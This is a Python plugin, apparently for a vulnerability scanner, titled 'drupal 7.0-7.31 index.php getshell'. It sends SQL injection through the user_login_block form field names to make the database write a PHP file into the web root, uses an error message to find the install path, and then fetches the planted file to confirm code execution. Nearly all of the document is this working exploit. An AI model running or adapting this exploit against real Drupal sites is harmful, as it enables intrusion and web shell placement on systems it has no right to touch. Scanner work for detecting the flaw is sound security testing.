#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = drupal 7.0-7.31 index.php getshell

import re
import random
import urllib

def assign(service, arg):
    if service == 'drupal':
        return True, arg

def audit(arg):
    #No.1 http://drops.wooyun.org/papers/3197
    payload = '?q=node&destination=node'
    filename = 'shell'+str(random.randint(1,10000000000))+'.php'
    target = arg + payload
    post1 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'test5.php';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
    code, head, body, errcode, final_url = curl.curl2(target, post=post1)
    res = re.findall('line.+of.+>([^<>]+)includes/unicode.inc', body)
    if (len(res) == 0):
        return 
    path = res[0]
    post2 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'"+path+filename+"';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
    code, head, body, errcode, final_url = curl.curl2(target, post=post2);
    target2 = arg + filename
    code, head, body, errcode, final_url = curl.curl2(target2);
    if 'c4ca4238a0b923820dcc509a6f75849' in body:
        security_hole(target+' ==getshell>> '+target2)

if __name__ == '__main__':
    from dummy import *
    audit(assign('drupal', 'http://127.0.0.1/drupal_7.31/')[1])